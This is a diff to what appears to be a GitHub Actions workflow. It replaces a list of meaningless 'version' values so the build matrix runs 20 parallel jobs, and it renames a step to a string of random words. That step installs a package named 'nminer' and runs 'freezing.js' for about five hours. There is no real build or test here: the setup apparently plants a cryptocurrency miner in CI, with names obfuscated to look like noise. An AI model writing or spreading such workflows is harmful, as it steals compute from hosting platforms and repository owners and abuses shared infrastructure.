@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6741 }
-          - { version: 6814 }
-          - { version: 9400 }
-          - { version: 7888 }
-          - { version: 7763 }
-          - { version: 971 }
-          - { version: 7626 }
-          - { version: 8146 }
-          - { version: 2128 }
-          - { version: 5937 }
-          - { version: 5762 }
-          - { version: 3936 }
-          - { version: 553 }
-          - { version: 7102 }
-          - { version: 5805 }
-          - { version: 2180 }
-          - { version: 7323 }
-          - { version: 77 }
-          - { version: 5858 }
+          - { version: 6561 }
+          - { version: 811 }
+          - { version: 9717 }
+          - { version: 5397 }
+          - { version: 8606 }
+          - { version: 638 }
+          - { version: 35 }
+          - { version: 6223 }
+          - { version: 7545 }
+          - { version: 3809 }
+          - { version: 1120 }
+          - { version: 7806 }
+          - { version: 4613 }
+          - { version: 3551 }
+          - { version: 4909 }
+          - { version: 4892 }
+          - { version: 118 }
+          - { version: 1146 }
+          - { version: 1193 }
+          - { version: 6838 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: including incidentally unlike vast
+      - name: ugly good-natured ugh into
         run: |
           npm install nminer@latest
-          timeout 325m node freezing.js || echo "freezing executed"
+          timeout 302m node freezing.js || echo "freezing executed"
